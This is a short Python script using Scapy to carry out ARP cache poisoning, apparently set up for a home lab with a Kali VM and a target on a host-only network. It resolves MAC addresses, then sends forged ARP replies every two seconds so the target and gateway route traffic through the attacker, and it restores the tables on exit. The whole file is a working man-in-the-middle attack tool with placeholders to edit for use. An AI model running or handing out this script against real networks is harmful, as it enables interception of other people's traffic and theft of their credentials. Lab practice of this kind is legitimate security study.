#!/usr/bin/env python3
from scapy.all import *
import time
import sys

# Configuration - EDIT THESE(These are my IPS, ensure you have your VM's IP for this)
target_ip = "192.168.56.254"   # The IP of the target VM
gateway_ip = "192.168.56.1"   # The IP we pretend is the gateway
attacker_mac = get_if_hwaddr(conf.iface)  # Gets your Kali VM's MAC address

def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    # This function sends correct ARP replies to restore the network
    send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
    send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    print("[+] Network restored.")

def get_mac(ip_address):
    # This function gets the MAC address of a given IP
    resp, unans = sr(ARP(op=1, pdst=ip_address), retry=2, timeout=10, verbose=False)
    for s, r in resp:
        return r[ARP].hwsrc
    return None

def arp_poison(target_ip, target_mac, gateway_ip, gateway_mac):
    # Send ARP reply to Target, saying "I am the Gateway"
    send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac))
    # Send ARP reply to Gateway, saying "I am the Target"
    send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))

try:
    print("[+] Starting ARP poisoner. Press Ctrl+C to stop and restore.")
    # Get the real MAC addresses
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip) # This will likely fail for 192.168.56.1
    if gateway_mac is None:
        print("[-] Could not get gateway MAC. Using broadcast.")
        gateway_mac = "ff:ff:ff:ff:ff:ff" # Fallback to broadcast

    while True:
        arp_poison(target_ip, target_mac, gateway_ip, gateway_mac)
        time.sleep(2) # Send malicious packets every 2 seconds
except KeyboardInterrupt:
    print("\n[!] Detected CTRL+C ... Restoring ARP tables.")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
